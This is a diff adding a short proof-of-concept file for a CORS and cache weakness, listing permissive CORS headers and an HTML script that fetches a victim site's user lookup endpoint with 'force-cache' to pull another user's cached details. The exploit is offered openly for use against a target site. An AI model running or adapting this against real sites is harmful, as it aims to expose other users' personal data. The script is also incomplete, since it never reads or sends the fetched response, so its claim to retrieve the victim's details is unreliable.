@@ -1,0 +1,20 @@
+#If this is How CORS Policy is implemented
+
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Methods: GET
+Access-Control-Allow-Headers: Content-Type, Authorization, Content-Length, X-Requested-With
+Access-Control-Allow-Credentials: false
+
+Then this POC can be used to fetch data from victims cache
+
+<html>
+<script>  
+var url = "https://victimsite/_/api/1.0/user/lookup.json?username={victim_USERNAME}";  
+fetch(url, {    
+    method: 'GET',    
+    cache: 'force-cache'
+    });
+</script>
+</html>
+
+#This might fetch all his details from Cache if Cache no-store is not implemented.
